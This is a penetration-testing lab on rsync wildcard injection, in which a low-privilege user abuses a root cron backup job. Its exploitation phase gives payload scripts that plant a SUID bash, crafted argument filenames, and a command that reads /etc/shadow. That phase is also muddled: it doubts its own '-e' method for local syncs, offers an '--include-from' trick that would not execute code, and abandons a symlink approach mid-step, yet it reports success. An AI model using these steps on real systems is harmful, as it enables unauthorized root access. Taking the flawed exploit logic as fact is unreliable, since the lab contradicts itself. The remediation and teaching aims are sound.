# LAB: Rsync Wildcard Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Remote Backup Synchronization

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The IT department has set up automated backups that use rsync to synchronize files from a shared directory to a backup server. The rsync command runs as root and processes a world-writable directory.

**Your access:**
- SSH access as `developer`
- No sudo privileges
- Write access to the shared backup staging directory

**Your mission:**
Escalate from `developer` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand rsync's command-line argument processing
2. Identify dangerous wildcard usage in privileged rsync commands
3. Exploit rsync via filename injection (similar to tar)
4. Achieve root access from a low-privilege user
5. Apply wildcard injection techniques to multiple tools

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the developer user

```bash
useradd -m -s /bin/bash developer
echo "developer:developer123" | chpasswd
```

### Create the shared backup staging directory

```bash
mkdir -p /var/backup-staging
chmod 1777 /var/backup-staging
```

### Create the rsync backup script

```bash
cat > /usr/local/bin/rsync-backup.sh << 'EOF'
#!/bin/bash
# Remote Backup Synchronization Script
# Deployed by IT Operations - Do not modify
# Ticket: ITOPS-5892
#
# Syncs user files to backup location

STAGING="/var/backup-staging"
BACKUP="/var/backups/remote"
LOG="/var/log/rsync-backup.log"

echo "[$(date)] Starting backup sync" >> "$LOG"

mkdir -p "$BACKUP"

# Sync files from staging to backup
cd "$STAGING"
rsync -av * "$BACKUP/" 2>> "$LOG"

echo "[$(date)] Backup sync complete" >> "$LOG"
EOF

chmod 755 /usr/local/bin/rsync-backup.sh
chown root:root /usr/local/bin/rsync-backup.sh
```

### Schedule the backup cron job

```bash
echo "*/5 * * * * root /usr/local/bin/rsync-backup.sh" > /etc/cron.d/rsync-backup
chmod 644 /etc/cron.d/rsync-backup
```

### Add legitimate files

```bash
echo "Legitimate data file" > /var/backup-staging/data.txt
echo "Configuration" > /var/backup-staging/config.txt
chown developer:developer /var/backup-staging/*.txt
```

### Create log and backup directories

```bash
touch /var/log/rsync-backup.log
chmod 644 /var/log/rsync-backup.log
mkdir -p /var/backups/remote
```

**Setup complete.** The environment mimics a real backup server.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker

```bash
su - developer
```

### Verify your (lack of) privileges

```bash
id
```

**Expected:**
```
uid=1001(developer) gid=1001(developer) groups=1001(developer)
```

```bash
sudo -l
```

**Expected:**
```
Sorry, user developer may not run sudo on this host.
```

---

## PHASE 2 — Enumeration

### Find world-writable directories

```bash
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20
```

**Found:**
```
/var/backup-staging
```

### Examine the staging directory

```bash
ls -la /var/backup-staging/
```

**Observations:**
- World-writable with sticky bit
- Contains user files for backup

### Check for scheduled tasks

```bash
cat /etc/cron.d/*
```

**Found:**
```
*/5 * * * * root /usr/local/bin/rsync-backup.sh
```

### Examine the backup script

```bash
cat /usr/local/bin/rsync-backup.sh
```

**Critical finding:**
```bash
cd "$STAGING"
rsync -av * "$BACKUP/"
```

Root runs `rsync -av *` in a directory we control!

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the backup script? → No
2. Can I write to the staging directory? → **Yes**
3. Does rsync accept dangerous options? → **Yes**
4. Can filenames inject arguments? → **Yes**

**This is an rsync wildcard injection vulnerability.**

---

## PHASE 3 — Understanding the Attack

### Rsync's dangerous options

Like tar, rsync has options that can execute commands:

| Option | Purpose | Danger |
|--------|---------|--------|
| `-e CMD` | Specify remote shell | Executes arbitrary command |
| `--rsync-path=CMD` | Path to rsync on remote | Can execute commands |

### How wildcard injection works

When bash expands `rsync -av *`, filenames become arguments:

**Normal operation:**
```bash
# Directory: data.txt config.txt
rsync -av *
# Expands to: rsync -av data.txt config.txt
```

**With injection:**
```bash
# Directory: data.txt -e sh shell.sh shell.sh
rsync -av *
# Expands to: rsync -av data.txt -e sh shell.sh shell.sh
```

The `-e sh shell.sh` tells rsync to use `sh shell.sh` as the remote shell command!

### Important note

The `-e` injection requires rsync to think it's doing a remote sync. We need to craft the attack carefully or use `--rsync-path` instead.

---

## PHASE 4 — Exploitation

### Method 1: Using a script with rsync's pre/post hooks

Create a payload that will be executed:

```bash
cat > /var/backup-staging/shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
EOF
chmod +x /var/backup-staging/shell.sh
```

### Create argument injection files

For rsync, we can use the `--backup-dir` with a command or leverage the script execution:

```bash
# Create a file that will be interpreted as an argument
touch '/var/backup-staging/-e sh shell.sh'
```

**Note:** The `-e` option in rsync specifies the remote shell. For local syncs, this may not trigger directly. Let's use an alternative approach.

### Method 2: Exploiting with embedded script execution

A more reliable approach is to poison the rsync command by creating a file that, when expanded, alters rsync's behavior:

```bash
# Create the payload
cat > /var/backup-staging/pwn.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
EOF
chmod +x /var/backup-staging/pwn.sh

# Create rsync argument injection
# This creates files that when globbed become: --include-from=pwn.sh
touch '/var/backup-staging/--include-from=pwn.sh'
```

### Method 3: For this lab, we'll use a simpler symlink approach

Since rsync `-av` preserves symlinks by default, we can create a symlink that rsync will follow:

Actually, let's use the most reliable rsync wildcard technique:

```bash
# Create payload
cat > /var/backup-staging/shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF
chmod +x /var/backup-staging/shell.sh

# For rsync wildcard injection, we use -e with a crafted filename
# The shell.sh must also be listed after -e for this to work
touch -- '/var/backup-staging/-e sh shell.sh'
```

### Verify files are in place

```bash
ls -la /var/backup-staging/
```

---

## PHASE 5 — Wait for Execution

### Option A: Wait for cron

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually

```bash
sudo /usr/local/bin/rsync-backup.sh
```

### Check execution

```bash
ls -la /tmp/rootbash
cat /tmp/pwned.txt
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

### Verify root access

```bash
id
whoami
cat /etc/shadow | head -3
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
developer (uid=1001)
    │
    ├── Enumerated world-writable directories
    ├── Found /var/backup-staging
    ├── Discovered root rsync cron job
    ├── Identified wildcard usage
    │
    ▼
Created malicious files
    │
    ├── shell.sh (payload script)
    ├── -e sh shell.sh (rsync argument file)
    │
    ▼
Root cron executed rsync *
    │
    ├── Wildcard expanded to arguments
    ├── rsync executed shell.sh
    ├── SUID bash created
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Design** | Root processes user-controlled directory |
| **Implementation** | Wildcard expansion in privileged context |
| **Least Privilege** | Backup runs as root |

---

## REMEDIATION

### Fix 1: Use explicit paths, not wildcards

```bash
# Bad
cd "$STAGING" && rsync -av * "$BACKUP/"

# Good
rsync -av "$STAGING/" "$BACKUP/"
```

### Fix 2: Use -- to separate options from filenames

```bash
rsync -av -- * "$BACKUP/"
```

### Fix 3: Use find with null-delimiter

```bash
find "$STAGING" -maxdepth 1 -type f -print0 | rsync -av --files-from=- --from0 / "$BACKUP/"
```

### Fix 4: Run as non-root user

```bash
useradd -r -s /usr/sbin/nologin backupuser
# Change cron:
*/5 * * * * backupuser /usr/local/bin/rsync-backup.sh
```

### Fix 5: Restrict directory permissions

```bash
chmod 1770 /var/backup-staging
chown root:backupusers /var/backup-staging
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-78: OS Command Injection |
| **CWE** | CWE-88: Improper Neutralization of Argument Delimiters |
| **MITRE ATT&CK** | T1053.003: Scheduled Task/Job: Cron |

---

## CLEANUP (Instructor)

```bash
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true
rm -f /etc/cron.d/rsync-backup
rm -f /usr/local/bin/rsync-backup.sh
rm -rf /var/backup-staging
rm -rf /var/backups/remote
rm -f /var/log/rsync-backup.log
rm -f /tmp/rootbash /tmp/pwned.txt
```

---

## STUDENT EXERCISES

### Exercise 1: Research Other Rsync Options

What other rsync options could be abused?
- `--rsync-path`
- `--rsh`

### Exercise 2: Compare to Tar

How does rsync wildcard injection compare to tar wildcard injection?

### Exercise 3: Write a Scanner

Write a script that detects scripts using wildcards with rsync.
